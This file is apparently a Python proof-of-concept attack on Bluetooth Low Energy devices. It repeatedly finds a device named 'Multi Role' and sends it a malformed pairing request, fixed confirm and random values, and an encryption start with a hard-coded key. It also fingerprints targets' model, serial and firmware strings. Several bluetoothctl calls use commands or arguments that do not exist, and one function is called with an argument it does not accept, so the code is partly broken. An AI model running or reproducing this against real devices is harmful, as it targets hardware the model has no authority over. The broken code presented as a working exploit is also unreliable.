#!/usr/bin/env python3
# Written by Kevin Mitchell
# Released as open source under GPLv3

import pexpect
import time
import re
import subprocess

class BluetoothCtl:
    def __init__(self):
        self.child = pexpect.spawn("bluetoothctl", encoding='utf-8')
        self.child.expect("#")
        self.gatt_characteristics_mapping = {
            'firmware_revision_string': '2a26',
            'model_number_string': '2a24',
            'serial_number_string': '2a25',
            'hardware_revision_string': '2a27',
            'software_revision_string': '2a28'
        }

    def send_stateless_command(self, command:str):
        process = subprocess.Popen(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = process.communicate()
        return str(out).replace("b'", "").replace("'", "")

    def send_command(self, command, timeout=5):
        self.child.sendline(command)
        self.child.expect("#", timeout=timeout)
        return self.child.before

    def power_on(self):
        self.send_command("power on")
        print("BLE dongle powered on")

    def power_off(self):
        self.send_command("power off")
        print("BLE dongle powered off")
        
    def scan(self):
        self.send_command("scan on")
        time.sleep(2) 
        scan_output = self.child.before
        self.send_command("scan off")
        print("Scan turned off")
        print("Scan output:\n", scan_output)
        
        if self.check_and_handle_error(scan_output):
            print("Retrying scan after handling error...")
            self.send_command("scan on")
            time.sleep(10)  # Adjust the sleep time if needed
            scan_output = self.child.before
            self.send_command("scan off")
            print("Retry scan output:\n", scan_output)
            
        return scan_output
        
    def check_and_handle_error(self, scan_output):
        if "Failed to stop discovery: org.bluez.Error.InProgress" in scan_output:
            print("Error encountered: Failed to stop discovery. Power cycling the BLE dongle.")
            self.power_off()
            time.sleep(2)
            self.power_on()
            return True
        return False
        
    def find_device(self, device_name):
        scan_output = self.scan()
        pattern = re.compile(r"((?:[0-9A-Fa-f]{{2}}:){{5}}[0-9A-Fa-f]{{2}})\s+{}".format(re.escape(device_name)), re.IGNORECASE)
        match = pattern.search(scan_output)
        if match:
            return match.group(1)  # Return the MAC address
        return None

    def send_pairing_request(self, mac_address):
        print(f"Sending Pairing Request to {mac_address}")
        pairing_request_data = (
            "000084008000060001000004100000010000041000000100000410000001000004100000010000041000000100000410"
            "000001000004100000010000041000000100000410000001000004100000010000041000000100000410000001000004"
            "100000010000041000000100000410000001000004100000010000041000000100000410000001000004100000010000"
            "0410000001"
        )
        self.send_command(f"pair {mac_address} {pairing_request_data}", timeout=5)

    def send_pairing_confirm(self, mac_address):
        print(f"Sending Pairing Confirm to {mac_address}")
        pairing_confirm_data = (
            "0000150011000600031d9adfe958dd809adcbd7c227274"
        )
        self.send_command(f"pairing confirm {mac_address} {pairing_confirm_data}", timeout=5)

    def send_pairing_random(self, mac_address):
        print(f"Sending Pairing Random to {mac_address}")
        pairing_random_data = (
            "000015001100060004c0c0c0c0c0c0c0c0c0c0c0c0c0c0"
        )
        self.send_command(f"pairing random {mac_address} {pairing_random_data}", timeout=5)

    def send_le_start_encryption(self, mac_address):
        print(f"Sending LE Start Encryption to {mac_address}")
        long_term_key = "bfb74c1f07f748a671e841deef3a05c2"
        self.send_command(f"le start-encryption {mac_address} {long_term_key}", timeout=5)
        
    def check_vulnerable_target(self, target_mac_address:str, hcidev: str):
        # Have to use HCITOOL/GATTTOOL for this one
        devices = self.send_stateless_command("hcitool dev")
        if hcidev in devices:
            mac = ''
            for device in devices.split('\\n'):
                if hcidev in device:
                    mac = device.split('\\t')[-1]
            print(f"hcitool located bluetooth dongle with MAC {mac}")
            print(f"probing device {target_mac_address}")
            gatt_layer_characteristic_descriptions = self.send_stateless_command(f"gatttool -i {hcidev} -b {target_mac_address} --char-desc")
            char_desc_map = dict((char, handle) for char, handle in [(x.split('=')[-1].split('-')[0][5:9], x.split('=')[1].split(',')[0].strip().replace('0x', '')) for x in gatt_layer_characteristic_descriptions.split('\\n')[:-1]])
            # Collect Model Number
            if self.gatt_characteristics_mapping['model_number_string'] in char_desc_map.keys():
                model_number = self.send_stateless_command(f"gatttool -i {hcidev} -b {target_mac_address} --char-read -a 0x{char_desc_map[self.gatt_characteristics_mapping['model_number_string']]}")
                model_number = bytearray.fromhex(model_number.split(': ')[-1].replace(' \\n', '').replace(' ', '')).decode()
            else:
                print(f"Common GATT characteristic hande for model number string not found on target {target_mac_address}")
            # Collect Serial Number
            if self.gatt_characteristics_mapping['serial_number_string'] in char_desc_map.keys():
                serial_number = self.send_stateless_command(f"gatttool -i {hcidev} -b {target_mac_address} --char-read -a 0x{char_desc_map[self.gatt_characteristics_mapping['serial_number_string']]}")
                serial_number = bytearray.fromhex(serial_number.split(': ')[-1].replace(' \\n', '').replace(' ', '')).decode()
            else:
                print(f"Common GATT characteristic hande for serial number string not found on target {target_mac_address}")
            # Collect Firmware Revision
            if self.gatt_characteristics_mapping['firmware_revision_string'] in char_desc_map.keys():
                firmware_revision = self.send_stateless_command(f"gatttool -i {hcidev} -b {target_mac_address} --char-read -a 0x{char_desc_map[self.gatt_characteristics_mapping['firmware_revision_string']]}")
                firmware_revision = bytearray.fromhex(firmware_revision.split(': ')[-1].replace(' \\n', '').replace(' ', '')).decode()
            else:
                print(f"Common GATT characteristic hande for firmware revision string not found on target {target_mac_address}")
            # Collect Hardware Revision
            if self.gatt_characteristics_mapping['hardware_revision_string'] in char_desc_map.keys():
                hardware_revision = self.send_stateless_command(f"gatttool -i {hcidev} -b {target_mac_address} --char-read -a 0x{char_desc_map[self.gatt_characteristics_mapping['hardware_revision_string']]}")
                hardware_revision = bytearray.fromhex(hardware_revision.split(': ')[-1].replace(' \\n', '').replace(' ', '')).decode()
            else:
                print(f"Common GATT characteristic hande for hardware revision string not found on target {target_mac_address}")
            # Collect Software Revision
            if self.gatt_characteristics_mapping['software_revision_string'] in char_desc_map.keys():
                software_revision = self.send_stateless_command(f"gatttool -i {hcidev} -b {target_mac_address} --char-read -a 0x{char_desc_map[self.gatt_characteristics_mapping['software_revision_string']]}")
                software_revision = bytearray.fromhex(software_revision.split(': ')[-1].replace(' \\n', '').replace(' ', '')).decode()
            else:
                print(f"Common GATT characteristic hande for software revision string not found on target {target_mac_address}")
        else:
            print("hcitool could not find specified device")

def main():
    bt = BluetoothCtl()
    bt.power_on()
    time.sleep(1)
    
    target_device_name = "Multi Role"
          
    def send_sequence():
        bt.send_pairing_request(mac_address)
        time.sleep(2)
        bt.send_pairing_confirm(mac_address)
        time.sleep(2)
        bt.send_pairing_random(mac_address)
        time.sleep(2)
        bt.send_le_start_encryption(mac_address)
        time.sleep(2)
        print("Sequence of pairing messages and LE Start Encryption sent successfully.")

    try:
        found_device = True
        while True:
            mac_address = bt.find_device(target_device_name)
            print("Searching for device: Multi Role")
            if mac_address:
                if not found_device:
                    print(f"Device '{target_device_name}' found with MAC address {mac_address}.")
                    found_device = True
                send_sequence(mac_address)
                print(f"Connected to {mac_address}.")
                time.sleep(2)  
            else:
                if found_device:
                    print(f"Device '{target_device_name}' no longer found.")
                    found_device = False
                print(f"Device '{target_device_name}' not found. Retrying...")
                time.sleep(2) 
                bt.power_on()
                time.sleep(2) 
    except KeyboardInterrupt:
        print("Exiting...")
    finally:
        bt.power_off()

if __name__ == "__main__":
    main()
